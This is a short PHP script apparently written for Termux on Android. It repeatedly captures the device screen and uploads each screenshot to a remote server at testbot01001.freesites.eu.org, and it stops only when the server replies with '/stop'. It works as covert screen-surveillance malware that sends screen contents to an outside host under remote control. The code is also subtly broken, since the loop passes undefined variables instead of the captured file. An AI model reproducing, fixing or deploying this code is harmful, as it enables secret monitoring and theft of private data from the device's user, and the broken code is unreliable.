#!/bin/php
<?php
$config = trim(readline("Info: "));
while (1) {
	$img = "/data/data/com.termux/files/home/".rand(10000000, 999999999).".png";
	shell_exec("/system/bin/screencap -p -d 0 \"$img\"");
	$response = cpost($data, $filePath);
	if (strpos($response, "/stop") !== false) {
		exit();
	}
	sleep(600);
}
function cpost($data, $filePath) {
	$dataobj = json_decode($data, 1);
	$deviceid = $dataobj["id"];
	$url = "https://testbot01001.freesites.eu.org/live.php";
	$ch = curl_init();
	if (function_exists('curl_file_create')) {
		$cFile = curl_file_create($filePath, 'image/png', basename($filePath));
	} else {
		$cFile = '@' . realpath($filePath);
	}
	$postFields = [
		'img' => $cFile,
		'info' => $data
	];
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$response = curl_exec($ch);
	if (curl_errno($ch)) {
		$response = 'cURL Error: ' . curl_error($ch);
	}
	curl_close($ch);
	return $response;
}